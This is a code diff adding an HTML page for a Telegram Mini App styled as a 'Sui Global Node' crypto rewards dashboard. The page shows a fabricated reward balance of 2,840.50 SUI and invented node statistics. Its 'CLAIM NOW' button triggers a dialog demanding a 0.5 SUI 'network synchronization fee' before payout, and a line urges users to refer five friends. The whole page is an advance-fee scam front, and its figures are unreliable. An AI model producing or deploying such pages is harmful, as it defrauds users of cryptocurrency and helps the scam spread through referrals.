@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sui Global Mini App</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        :root { --sui-blue: #00a3ff; --bg-dark: #0b1426; }
+        body { background-color: var(--bg-dark); color: white; font-family: 'Inter', sans-serif; margin: 0; padding: 0; overflow-x: hidden; }
+        .app-container { padding: 20px; text-align: center; }
+        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 20px; }
+        .stat-box { background: rgba(255, 255, 255, 0.05); padding: 15px; border-radius: 15px; border: 1px solid rgba(0, 163, 255, 0.2); }
+        .main-card { background: linear-gradient(180deg, #00a3ff 0%, #0066ff 100%); border-radius: 25px; padding: 30px; margin-top: 20px; box-shadow: 0 15px 35px rgba(0, 102, 255, 0.4); }
+        .claim-btn { background: white; color: #0066ff; border: none; padding: 15px 50px; border-radius: 50px; font-weight: bold; font-size: 18px; margin-top: 25px; cursor: pointer; width: 80%; }
+        .status-dot { height: 10px; width: 10px; background-color: #00ff88; border-radius: 50%; display: inline-block; margin-right: 5px; box-shadow: 0 0 10px #00ff88; }
+    </style>
+</head>
+<body>
+    <div class="app-container">
+        <h3 style="margin-bottom: 5px;">Sui Global Node</h3>
+        <p style="font-size: 12px; opacity: 0.6;"><span class="status-dot"></span> System Operational</p>
+
+        <div class="main-card">
+            <p style="margin: 0; font-size: 14px;">Total Reward Balance</p>
+            <h1 style="font-size: 45px; margin: 10px 0;">2,840.50 <span style="font-size: 20px;">$SUI</span></h1>
+            <p style="margin: 0; opacity: 0.9;">≈ $2,641.66 USD</p>
+        </div>
+
+        <div class="stats-grid">
+            <div class="stat-box">
+                <p style="font-size: 11px; opacity: 0.7;">Network Speed</p>
+                <p style="font-weight: bold;">1.2 Gbps</p>
+            </div>
+            <div class="stat-box">
+                <p style="font-size: 11px; opacity: 0.7;">Node Tier</p>
+                <p style="font-weight: bold; color: #ffcc00;">Platinum</p>
+            </div>
+        </div>
+
+        <button class="claim-btn" onclick="handleClaim()">CLAIM NOW</button>
+        
+        <div style="margin-top: 30px; border-top: 1px solid rgba(255,255,255,0.1); padding-top: 20px;">
+            <p style="font-size: 13px; color: #00a3ff;">Refer 5 friends to unlock VIP Payouts</p>
+        </div>
+    </div>
+
+    <script>
+        let tg = window.Telegram.WebApp;
+        tg.expand();
+        tg.backgroundColor = "#0b1426";
+        tg.headerColor = "#0b1426";
+
+        function handleClaim() {
+            tg.showConfirm("To transfer rewards, a network synchronization fee of 0.5 SUI is required. Proceed to verification?");
+        }
+    </script>
+</body>
+</html>
